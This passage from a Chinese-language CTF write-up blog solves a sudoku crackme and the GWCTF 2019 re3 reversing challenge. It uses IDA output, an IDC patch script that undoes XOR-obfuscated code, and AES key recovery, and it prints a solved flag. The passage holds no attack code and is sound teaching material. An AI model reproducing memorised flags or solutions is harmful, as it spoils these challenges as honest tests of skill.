class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_4006D6</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(a1) == <span class="number">10</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">9</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( a1[i] &gt; <span class="number">52</span> || a1[i] &lt;= <span class="number">47</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_2;</span><br><span class="line">    &#125;</span><br><span class="line">    result = <span class="number">1LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">LABEL_2:</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Wrong!&quot;</span>);</span><br><span class="line">    result = <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数<code>sub_4006D6</code>要求输入的字符串长度为10且字符集为&quot;01234&quot;<br />通过控制输入, 动态调试<code>sub_400807</code>得到重新排序之后的字符串<br /><s>因为实在懒得看代码了, 曲线救国</s></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0123401234</span><br><span class="line">2331440021</span><br><span class="line"></span><br><span class="line">0011223344</span><br><span class="line">3140420213</span><br></pre></td></tr></table></figure><p>根据两组输入输出则可以得出解密序列为</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">seq = [<span class="number">6</span>, <span class="number">3</span>, <span class="number">8</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">4</span>]</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_400881</span><span class="params">(<span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  byte_601062 = *a1;</span><br><span class="line">  byte_601067 = a1[<span class="number">1</span>];</span><br><span class="line">  byte_601069 = a1[<span class="number">2</span>];</span><br><span class="line">  byte_60106B = a1[<span class="number">3</span>];</span><br><span class="line">  byte_60106E = a1[<span class="number">4</span>];</span><br><span class="line">  byte_60106F = a1[<span class="number">5</span>];</span><br><span class="line">  byte_601071 = a1[<span class="number">6</span>];</span><br><span class="line">  byte_601072 = a1[<span class="number">7</span>];</span><br><span class="line">  byte_601076 = a1[<span class="number">8</span>];</span><br><span class="line">  result = (<span class="keyword">unsigned</span> __int8)a1[<span class="number">9</span>];</span><br><span class="line">  byte_601077 = a1[<span class="number">9</span>];</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">.data:0000000000601060 unk_601060      db  31h ; 1</span><br><span class="line">.data:0000000000601061                 db  34h ; 4</span><br><span class="line">.data:0000000000601062 byte_601062     db 23h                  ; DATA XREF: sub_400881+F↑w</span><br><span class="line">.data:0000000000601063                 db  32h ; 2</span><br><span class="line">.data:0000000000601064                 db  33h ; 3</span><br><span class="line">.data:0000000000601065                 db  33h ; 3</span><br><span class="line">.data:0000000000601066                 db  30h ; 0</span><br><span class="line">.data:0000000000601067 byte_601067     db 23h                  ; DATA XREF: sub_400881+1D↑w</span><br><span class="line">.data:0000000000601068                 db  31h ; 1</span><br><span class="line">.data:0000000000601069 byte_601069     db 23h                  ; DATA XREF: sub_400881+2B↑w</span><br><span class="line">.data:000000000060106A                 db  30h ; 0</span><br><span class="line">.data:000000000060106B byte_60106B     db 23h                  ; DATA XREF: sub_400881+39↑w</span><br><span class="line">.data:000000000060106C                 db  32h ; 2</span><br><span class="line">.data:000000000060106D                 db  33h ; 3</span><br><span class="line">.data:000000000060106E byte_60106E     db 23h                  ; DATA XREF: sub_400881+47↑w</span><br><span class="line">.data:000000000060106F byte_60106F     db 23h                  ; DATA XREF: sub_400881+55↑w</span><br><span class="line">.data:0000000000601070                 db  33h ; 3</span><br><span class="line">.data:0000000000601071 byte_601071     db 23h                  ; DATA XREF: sub_400881+63↑w</span><br><span class="line">.data:0000000000601072 byte_601072     db 23h                  ; DATA XREF: sub_400881+71↑w</span><br><span class="line">.data:0000000000601073                 db  30h ; 0</span><br><span class="line">.data:0000000000601074                 db  34h ; 4</span><br><span class="line">.data:0000000000601075                 db  32h ; 2</span><br><span class="line">.data:0000000000601076 byte_601076     db 23h                  ; DATA XREF: sub_400881+7F↑w</span><br><span class="line">.data:0000000000601077 byte_601077     db 23h                  ; DATA XREF: sub_400881+8D↑w</span><br><span class="line">.data:0000000000601078                 db  31h ; 1</span><br></pre></td></tr></table></figure><p>可以看到通过v7赋值的地址都是恰好是空值的位置, 则这里是在填空</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">sub_400917</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v1; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">int</span> j; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> k; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v1 = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">4</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">4</span>; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">for</span> ( k = j + <span class="number">1</span>; k &lt;= <span class="number">4</span>; ++k )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( *((byte_0 *)&amp;unk_601060 + <span class="number">5</span> * i + j) == *((byte_0 *)&amp;unk_601060 + <span class="number">5</span> * i + k) )</span><br><span class="line">          v1 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> ( *((byte_0 *)&amp;unk_601060 + <span class="number">5</span> * j + i) == *((byte_0 *)&amp;unk_601060 + <span class="number">5</span> * k + i) )</span><br><span class="line">          v1 = <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看到这里就差不多明白了<br />横纵不能出现相同的数字, 那么这个程序就是个数独游戏了<br />且数独的布局如下</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudoku = [</span><br><span class="line"><span class="number">1</span>, <span class="number">4</span>, X, <span class="number">2</span>, <span class="number">3</span>,</span><br><span class="line"><span class="number">3</span>, <span class="number">0</span>, X, <span class="number">1</span>, X,</span><br><span class="line"><span class="number">0</span>, X, <span class="number">2</span>, <span class="number">3</span>, X,</span><br><span class="line">X, <span class="number">3</span>, X, X, <span class="number">0</span>,</span><br><span class="line"><span class="number">4</span>, <span class="number">2</span>, X, X, <span class="number">1</span>]</span><br></pre></td></tr></table></figure><p>解出后得出序列为</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cipher = [<span class="number">0</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">0</span>]</span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line">cipher = [<span class="number">0</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">0</span>]</span><br><span class="line">seq = [<span class="number">6</span>, <span class="number">3</span>, <span class="number">8</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">4</span>]</span><br><span class="line">flag = [<span class="number">0</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>)]</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cipher)):</span><br><span class="line">  flag[_] = <span class="built_in">str</span>(cipher[seq[_]])</span><br><span class="line">print(<span class="string">&quot;flag&#123;&quot;</span>+<span class="string">&quot;&quot;</span>.join(flag)+<span class="string">&quot;&#125;&quot;</span>)</span><br></pre></td></tr></table></figure><blockquote><p><strong>flag{1134240024}</strong></p></blockquote><hr /><h1 id="gwctf-2019re3"><a class="markdownIt-Anchor" href="#gwctf-2019re3"></a> [GWCTF 2019]re3</h1><p>链接: <a href="https://buuoj.cn/challenges#%5BGWCTF%202019%5Dre3">https://buuoj.cn/challenges#[GWCTF 2019]re3</a></p><p>ELF 64</p><p>IDA中 <strong>main</strong> 函数反编译结果如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall __noreturn <span class="title">main</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+8h] [rbp-48h]</span></span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">40</span>]; <span class="comment">// [rsp+20h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+48h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%39s&quot;</span>, s);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="built_in">strlen</span>(s) != <span class="number">32</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Wrong!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  mprotect(&amp;dword_400000, <span class="number">0xF000</span>uLL, <span class="number">7</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">223</span>; ++i )</span><br><span class="line">    *((byte_0 *)sub_402219 + i) ^= <span class="number">0x99</span>u;</span><br><span class="line">  sub_40207B(&amp;unk_603170);</span><br><span class="line">  sub_402219(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">223</span>; ++i )</span><br><span class="line">  *((byte_0 *)sub_402219 + i) ^= <span class="number">0x99</span>u;</span><br></pre></td></tr></table></figure><p>注意看着一段代码<br />这里在对函数<code>sub_402219</code>的内容进行异或运算</p><p>而<code>sub_402219</code>的内容如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000402219 sub_402219      proc near               ; CODE XREF: main+CA↑p</span><br><span class="line">.text:0000000000402219                                         ; DATA XREF: main:loc_40217C↑o</span><br><span class="line">.text:0000000000402219 ; __unwind &#123;</span><br><span class="line">.text:0000000000402219                 int     3               ; Trap to Debugger</span><br><span class="line">.text:0000000000402219 sub_402219      endp</span><br><span class="line">.text:0000000000402219</span><br><span class="line">.text:0000000000402219 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:000000000040221A                 dw 10D1h, 0D17Ch, 7518h</span><br><span class="line">.text:0000000000402220                 dq 812410D199999969h, 0BC9D12D1FD666666h, 61DC10D1999999B1h</span><br><span class="line">.text:0000000000402220                 dq 6666A91C14D159A8h, 10D199F9A8E92766h, 12D1666671BA715Eh</span><br><span class="line">.text:0000000000402220                 dq 1C14D1666666810Ch, 0D14F10D1666666A9h, 0D166666E9E715E10h</span><br><span class="line">.text:0000000000402220                 dq 14D1666666811C12h, 6666A91C14D189C9h, 715E10D14F10D166h</span><br><span class="line">.text:0000000000402220                 dq 66B11C5E66666F73h, 1C5E999999986666h, 99999999666666B5h</span><br><span class="line">.text:0000000000402220                 dq 666666B51C12A372h, 66811C12D149FAD1h, 892F964998D16666h</span><br><span class="line">.text:0000000000402220                 dq 1D1666666B51C12h, 0A199F9A939192F96h, 6666B11C5E93ED5Bh</span><br><span class="line">.text:0000000000402220                 dq 0B51C1A9999999966h, 66B5241A98666666h, 0B11C1224E7866666h</span><br><span class="line">.text:0000000000402220                 dq 0FD61D412D1666666h, 999999B1BC95AAD1h, 5066667AC0719CEDh</span><br><span class="line">.text:0000000000402220                 dq 801F0F5Ah</span><br><span class="line">.text:0000000000402300</span><br></pre></td></tr></table></figure><p>那么可以看到函数中内容无法被IDA解析, 所以被认为是数据<br />所以我们需要使用IDC脚本来对这部分数据进行还原</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;idc.idc&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">auto</span> addr = <span class="number">0x402219</span>;</span><br><span class="line">    <span class="keyword">auto</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt;= <span class="number">223</span>; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        PatchByte(addr+i, Byte(addr+i)^<span class="number">0x99</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先全部转为数据, 再强制转为代码, 最后再创建函数, 且<code>main</code>函数里<code>nop</code>掉那段循环异或的代码<br />同时main函数需要包含<code>loc_402205</code>, <code>loc_40220F</code>这两段代码, 操作同上</p><p>还原之后的函数<code>main</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall __noreturn <span class="title">main</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">40</span>]; <span class="comment">// [rsp+20h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+48h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%39s&quot;</span>, s);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="built_in">strlen</span>(s) != <span class="number">32</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Wrong!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  mprotect(&amp;dword_400000, <span class="number">0xF000</span>uLL, <span class="number">7</span>);</span><br><span class="line">  sub_40207B((__int64)&amp;unk_603170);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)sub_402219((__int64)s) )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Correct!&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Wrong!&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先分析函数<code>sub_40207B</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 __fastcall <span class="title">sub_40207B</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v2[<span class="number">16</span>]; <span class="comment">// [rsp+10h] [rbp-50h] BYREF</span></span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+20h] [rbp-40h] BYREF</span></span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+30h] [rbp-30h] BYREF</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+40h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+58h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  sub_401CF9(&amp;BASE64_table_603120, <span class="number">0x40</span>uLL, (__int64)v2);</span><br><span class="line">  sub_401CF9(&amp;CRC32_table_603100, <span class="number">0x14</span>uLL, (__int64)&amp;v3);</span><br><span class="line">  sub_401CF9(&amp;Prime_Constants_char_6030C0, <span class="number">0x35</span>uLL, (__int64)&amp;v4);</span><br><span class="line">  sub_401CF9(MD5_Constants_4025C0, <span class="number">0x100</span>uLL, (__int64)&amp;v5);</span><br><span class="line">  sub_401CF9(v2, <span class="number">0x40</span>uLL, a1);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>BASE64_table_603120</code>经过函数<code>sub_401CF9</code>的运行之后结果保存于<code>v2</code><br /><code>v2</code>经过函数<code>sub_401CF9</code>的运行之后结果保存于<code>a1</code>, 即<code>unk_603170</code></p><p>代码过于复杂, 动调得到<code>unk_603170</code>的内容</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">_603170 = [</span><br><span class="line"><span class="number">0xCB</span>, <span class="number">0x8D</span>, <span class="number">0x49</span>, <span class="number">0x35</span>, <span class="number">0x21</span>, <span class="number">0xB4</span>, <span class="number">0x7A</span>, <span class="number">0x4C</span>, </span><br><span class="line"><span class="number">0xC1</span>, <span class="number">0xAE</span>, <span class="number">0x7E</span>, <span class="number">0x62</span>, <span class="number">0x22</span>, <span class="number">0x92</span>, <span class="number">0x66</span>, <span class="number">0xCE</span>]</span><br></pre></td></tr></table></figure><p>分析<code>sub_402219</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_402219</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// [rsp+18h] [rbp-D8h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+1Ch] [rbp-D4h]</span></span><br><span class="line">  <span class="keyword">char</span> v4[<span class="number">200</span>]; <span class="comment">// [rsp+20h] [rbp-D0h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+E8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  sub_400A71((__int64)v4, (__int64)&amp;unk_603170);</span><br><span class="line">  sub_40196E((__int64)v4, a1);</span><br><span class="line">  sub_40196E((__int64)v4, a1 + <span class="number">16</span>);</span><br><span class="line">  v2 = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">31</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *(byte_0 *)(i + a1) != qword_6030A0[i] )</span><br><span class="line">      v2 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>sub_400A71</code>处理<code>unk_603170</code><br />继续跟进看到一个名为<code>RijnDael_AES_LONG_4023A0</code>数据段, 那么基本可以判断这是一个AES加密程序了<br /><code>sub_40196E</code>也就是用于加密用户所输入的字符串, 且加密模式为ECB(32字节的数据分两次单独加密), 最后的密文存于<code>qword_6030A0</code></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">_6030A0 = [</span><br><span class="line"><span class="number">0xBC</span>, <span class="number">0x0A</span>, <span class="number">0xAD</span>, <span class="number">0xC0</span>, <span class="number">0x14</span>, <span class="number">0x7C</span>, <span class="number">0x5E</span>, <span class="number">0xCC</span>, </span><br><span class="line"><span class="number">0xE0</span>, <span class="number">0xB1</span>, <span class="number">0x40</span>, <span class="number">0xBC</span>, <span class="number">0x9C</span>, <span class="number">0x51</span>, <span class="number">0xD5</span>, <span class="number">0x2B</span>, </span><br><span class="line"><span class="number">0x46</span>, <span class="number">0xB2</span>, <span class="number">0xB9</span>, <span class="number">0x43</span>, <span class="number">0x4D</span>, <span class="number">0xE5</span>, <span class="number">0x32</span>, <span class="number">0x4B</span>, </span><br><span class="line"><span class="number">0xAD</span>, <span class="number">0x7F</span>, <span class="number">0xB4</span>, <span class="number">0xB3</span>, <span class="number">0x9C</span>, <span class="number">0xDB</span>, <span class="number">0x4B</span>, <span class="number">0x5B</span>]</span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line">_603170 = [</span><br><span class="line"><span class="number">0xCB</span>, <span class="number">0x8D</span>, <span class="number">0x49</span>, <span class="number">0x35</span>, <span class="number">0x21</span>, <span class="number">0xB4</span>, <span class="number">0x7A</span>, <span class="number">0x4C</span>, </span><br><span class="line"><span class="number">0xC1</span>, <span class="number">0xAE</span>, <span class="number">0x7E</span>, <span class="number">0x62</span>, <span class="number">0x22</span>, <span class="number">0x92</span>, <span class="number">0x66</span>, <span class="number">0xCE</span>]</span><br><span class="line">_6030A0 = [</span><br><span class="line"><span class="number">0xBC</span>, <span class="number">0x0A</span>, <span class="number">0xAD</span>, <span class="number">0xC0</span>, <span class="number">0x14</span>, <span class="number">0x7C</span>, <span class="number">0x5E</span>, <span class="number">0xCC</span>, </span><br><span class="line"><span class="number">0xE0</span>, <span class="number">0xB1</span>, <span class="number">0x40</span>, <span class="number">0xBC</span>, <span class="number">0x9C</span>, <span class="number">0x51</span>, <span class="number">0xD5</span>, <span class="number">0x2B</span>, </span><br><span class="line"><span class="number">0x46</span>, <span class="number">0xB2</span>, <span class="number">0xB9</span>, <span class="number">0x43</span>, <span class="number">0x4D</span>, <span class="number">0xE5</span>, <span class="number">0x32</span>, <span class="number">0x4B</span>, </span><br><span class="line"><span class="number">0xAD</span>, <span class="number">0x7F</span>, <span class="number">0xB4</span>, <span class="number">0xB3</span>, <span class="number">0x9C</span>, <span class="number">0xDB</span>, <span class="number">0x4B</span>, <span class="number">0x5B</span>]</span><br><span class="line">cipher = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> _6030A0:</span><br><span class="line">  cipher += <span class="built_in">chr</span>(_)</span><br><span class="line">key = <span 